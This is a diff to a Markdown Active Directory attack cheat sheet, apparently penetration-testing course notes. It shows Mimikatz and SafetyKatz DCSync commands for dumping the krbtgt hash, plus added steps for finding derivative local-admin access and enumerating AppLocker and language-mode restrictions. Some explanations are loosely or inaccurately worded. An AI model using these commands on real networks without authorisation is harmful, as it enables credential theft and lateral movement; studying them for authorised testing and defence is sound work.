@@ -100,7 +100,20 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
-# 
+# Derivative Local Admin
 ```powershell
+Derivative means, if user A in machine A has local admin access on machine B & user B in machine B, has local admin access on machine C, this means user A has local admin access on machine C.
+#1- Find machines on which you have local admin privilege.
+PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+PS> Find-PSRemotingLocalAdminAccess
 
+#2- App locker check
+#if you attempted to use any script ex. AMSI bypass you will get "Cannot invoke method. Method invocation is supported on core type in this language mode" error
+PS> $ExecutionContext.SessionState.LanguageMode  #Check language mode
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  #list app locker policy
+
+![image](https://github.com/user-attachments/assets/1b1add80-26ac-4bd2-97ca-025bc0820117)
+
+1-  Rule No.1 Allow every user to run all scripts located in the program files folder
+2-  Rule No.2 Allow every user to run all scripts located in the windows32 folder
 ```
